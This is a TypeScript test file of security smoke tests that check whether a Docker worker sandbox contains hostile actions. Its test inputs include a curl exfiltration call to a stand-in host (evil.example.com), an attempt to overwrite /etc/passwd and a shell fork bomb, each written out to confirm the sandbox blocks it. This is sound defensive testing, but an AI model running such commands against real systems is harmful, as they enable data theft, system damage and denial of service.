/**
 * Sandbox security smoke tests (Task 3.3).
 *
 * Verifies that the `devscope/worker-sandbox:local` image, when invoked
 * under the runtime contract documented in `docker/worker-sandbox/README.md`,
 * cannot be subverted by a malicious candidate or repo. Each test runs a
 * fresh container with the locked-down flags and asserts the hostile
 * attempt is contained.
 *
 * Opt-in via `RUN_SANDBOX_SMOKE=1` so the suite does not slow down
 * `bun test`. CI runs this on a separate gate. Prerequisites:
 *   1. `devscope/worker-sandbox:local` image is built (Task 3.1).
 *   2. `egress-proxy` service is running on the
 *      `devscope-cloud_devscope-egress-allowlist` network (Task 3.2).
 *
 * Run from repo root:
 *   docker compose up -d egress-proxy
 *   cd packages/backend
 *   RUN_SANDBOX_SMOKE=1 bun test src/services/__tests__/sandbox.smoke.test.ts
 */
import { afterEach, beforeAll, describe, expect, test } from "bun:test";
import { spawnSync, type SpawnSyncReturns } from "node:child_process";
import { randomBytes } from "node:crypto";

const ENABLED = process.env.RUN_SANDBOX_SMOKE === "1";
const skipIf = (cond: boolean) => (cond ? test.skip : test);

const IMAGE = "devscope/worker-sandbox:local";
const NETWORK = "devscope-cloud_devscope-egress-allowlist";
const PROXY = "http://egress-proxy:8888";

// Track containers we start with --name so afterEach can guarantee cleanup
// even if a test throws or a container is somehow still alive.
const spawnedNames: string[] = [];

/** Allocate a unique container name for a test. */
function nameFor(label: string): string {
  const n = `devscope-smoke-${label}-${randomBytes(4).toString("hex")}`;
  spawnedNames.push(n);
  return n;
}

/**
 * Common runtime-contract flags. Mirrors the v1.5 invocation in
 * `docker/worker-sandbox/README.md` exactly. Does NOT include
 * `--rm` because we want to inspect / clean up explicitly per test.
 */
function contractFlags(name: string): string[] {
  return [
    "run",
    "--name",
    name,
    "--rm",
    "-i",
    "--network",
    NETWORK,
    "--read-only",
    "--tmpfs",
    "/work:rw,size=512m,uid=1000",
    "--tmpfs",
    "/tmp:rw,size=64m,uid=1000",
    "--user",
    "1000:1000",
    "--cap-drop=ALL",
    "--memory=2g",
    "--pids-limit=256",
    "--env",
    `HTTPS_PROXY=${PROXY}`,
    "--env",
    `HTTP_PROXY=${PROXY}`,
    "--env",
    "NO_PROXY=localhost,127.0.0.1",
  ];
}

interface DockerResult {
  stdout: string;
  stderr: string;
  status: number | null;
  signal: NodeJS.Signals | null;
}

function toResult(r: SpawnSyncReturns<Buffer>): DockerResult {
  return {
    stdout: r.stdout?.toString("utf8") ?? "",
    stderr: r.stderr?.toString("utf8") ?? "",
    status: r.status,
    signal: r.signal,
  };
}

/**
 * Run sandbox with the entrypoint default (reads candidate JSON on stdin).
 */
function runSandboxWithCandidate(
  name: string,
  candidate: object,
  timeoutMs = 60_000
): DockerResult {
  const args = [...contractFlags(name), IMAGE];
  return toResult(
    spawnSync("docker", args, {
      input: JSON.stringify(candidate),
      timeout: timeoutMs,
    })
  );
}

/**
 * Run sandbox with a custom shell command (overrides entrypoint).
 */
function runSandboxShell(
  name: string,
  shellCommand: string,
  timeoutMs = 30_000
): DockerResult {
  const args = [
    ...contractFlags(name),
    "--entrypoint",
    "sh",
    IMAGE,
    "-c",
    shellCommand,
  ];
  return toResult(spawnSync("docker", args, { timeout: timeoutMs }));
}

// ---------------------------------------------------------------------------
// Setup: verify prerequisites or skip the suite cleanly.
// ---------------------------------------------------------------------------
let preflight: { ok: boolean; reason: string } = { ok: true, reason: "" };

beforeAll(() => {
  if (!ENABLED) return;

  const img = spawnSync("docker", ["image", "inspect", IMAGE], {
    encoding: "utf8",
  });
  if (img.status !== 0) {
    preflight = {
      ok: false,
      reason: `image ${IMAGE} not found — build it: cd docker/worker-sandbox && docker build -t ${IMAGE} .`,
    };
    return;
  }

  const net = spawnSync(
    "docker",
    ["network", "inspect", NETWORK, "--format", "{{.Name}}"],
    { encoding: "utf8" }
  );
  if (net.status !== 0) {
    preflight = {
      ok: false,
      reason: `network ${NETWORK} missing — bring up egress-proxy: docker compose up -d egress-proxy`,
    };
    return;
  }

  // Probe the proxy via a one-shot container on the same network.
  const probe = spawnSync(
    "docker",
    [
      "run",
      "--rm",
      "--network",
      NETWORK,
      "--entrypoint",
      "sh",
      IMAGE,
      "-c",
      "getent hosts egress-proxy >/dev/null && echo ok",
    ],
    { encoding: "utf8", timeout: 15_000 }
  );
  if (probe.status !== 0 || !probe.stdout?.includes("ok")) {
    preflight = {
      ok: false,
      reason: `egress-proxy unreachable on ${NETWORK} — run: docker compose up -d egress-proxy`,
    };
  }
});

afterEach(() => {
  // Best-effort kill+rm of any container we named, in case a test threw or
  // the container exceeded its timeout (spawnSync sends SIGTERM on timeout
  // but docker run may leave the container alive).
  for (const n of spawnedNames.splice(0)) {
    spawnSync("docker", ["rm", "-f", n], { stdio: "ignore", timeout: 10_000 });
  }
});

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
describe("sandbox security smoke", () => {
  skipIf(!ENABLED)("preflight passed", () => {
    if (!preflight.ok) {
      throw new Error(preflight.reason);
    }
    expect(preflight.ok).toBe(true);
  });

  skipIf(!ENABLED || !preflight.ok)(
    "should not be able to curl an external host outside the allowlist",
    () => {
      // Direct verification: exec curl inside the sandbox toward a
      // non-allowlisted host. The proxy must reject (typically HTTP 403).
      const result = runSandboxShell(
        nameFor("egress"),
        // -s suppresses progress; -o /dev/null discards body; -w prints the
        // HTTP status; --max-time 5 caps the request.
        "curl -s -o /dev/null -w '%{http_code}' --max-time 5 http://evil.example.com/exfil || echo CURL_ERR",
        20_000
      );
      // Either curl returns a 403 from the proxy, or it errors out.
      // A 200 would indicate the request reached evil.example.com.
      const out = `${result.stdout}${result.stderr}`;
      expect(out).not.toMatch(/^200/);
      expect(out).toMatch(/403|CURL_ERR/);
    }
  );

  skipIf(!ENABLED || !preflight.ok)(
    "should not be able to write outside /work",
    () => {
      const result = runSandboxShell(
        nameFor("readonly"),
        // Try to clobber a system file. /etc is on the read-only image FS.
        "echo malicious > /etc/passwd 2>&1; echo EXIT=$?",
        15_000
      );
      const out = `${result.stdout}${result.stderr}`;
      expect(out).toMatch(/Read-only file system/i);
      expect(out).not.toMatch(/EXIT=0/);
    }
  );

  skipIf(!ENABLED || !preflight.ok)(
    "should not be able to fork-bomb",
    () => {
      // Classic shell fork bomb. With --pids-limit=256 the kernel will
      // refuse new forks; we cap wall-clock at 30s so the test cannot hang
      // even if cleanup glitches. afterEach force-removes the container.
      const result = runSandboxShell(
        nameFor("forkbomb"),
        // Wrap in timeout 10 so the bomb terminates inside the container
        // even if the kernel keeps allowing some forks. Either way the
        // container must exit on its own — that's what we assert.
        ":(){ :|:& };: ; sleep 10",
        30_000
      );
      // The container must have terminated (status non-null OR signal set).
      // If `signal` is set, spawnSync killed docker on timeout, which would
      // be a failure — the host should not need to intervene.
      expect(result.signal).toBeNull();
    }
  );

  skipIf(!ENABLED || !preflight.ok)(
    "should not be able to access the docker socket",
    () => {
      const result = runSandboxShell(
        nameFor("dockersock"),
        "ls /var/run/docker.sock 2>&1; echo EXIT=$?",
        10_000
      );
      const out = `${result.stdout}${result.stderr}`;
      expect(out).toMatch(/No such file or directory/i);
      expect(out).toMatch(/EXIT=[^0]/);
    }
  );

  skipIf(!ENABLED || !preflight.ok)(
    "should not be able to load extra capabilities",
    () => {
      const result = runSandboxShell(
        nameFor("caps"),
        "grep -E '^Cap(Inh|Prm|Eff|Bnd|Amb):' /proc/self/status",
        10_000
      );
      expect(result.status).toBe(0);
      // With --cap-drop=ALL every capability mask must be all zeros.
      const lines = result.stdout
        .split("\n")
        .filter((l) => /^Cap(Inh|Prm|Eff|Bnd|Amb):/.test(l));
      expect(lines.length).toBeGreaterThanOrEqual(4);
      for (const l of lines) {
        const hex = l.split(/\s+/)[1] ?? "";
        // CapBnd may legitimately differ on some kernels but with --cap-drop=ALL
        // userland-relevant masks (Eff, Prm, Inh, Amb) must be 0.
        if (/^Cap(Eff|Prm|Inh|Amb):/.test(l)) {
          expect(hex).toMatch(/^0+$/);
        }
      }
    }
  );

  skipIf(!ENABLED || !preflight.ok)(
    "should successfully clone an allowlisted repo",
    () => {
      const candidate = {
        id: `cand_smoke_${randomBytes(3).toString("hex")}`,
        kind: "claude_md",
        repo_clone_url: "https://github.com/octocat/Hello-World.git",
        repo_default_branch: "master",
        evidence_refs: {
          sessionIds: ["sess_smoke"],
          patternIds: [],
          antiPatternIds: [],
          insightIds: [],
        },
        summary: "smoke positive case",
      };
      const result = runSandboxWithCandidate(nameFor("positive"), candidate, 90_000);
      // Entrypoint always exits 0 with structured JSON (success or failure).
      expect(result.status).toBe(0);
      // stdout's last non-empty line is the artifact JSON.
      const lastLine = result.stdout
        .split("\n")
        .map((l) => l.trim())
        .filter(Boolean)
        .pop();
      expect(lastLine).toBeDefined();
      let artifact: any;
      try {
        artifact = JSON.parse(lastLine!);
      } catch (e) {
        throw new Error(
          `artifact stdout was not valid JSON: ${lastLine}\nstderr: ${result.stderr}`
        );
      }
      expect(artifact.status).toBe("completed");
      expect(artifact.candidate_id).toBe(candidate.id);
    }
  );
});
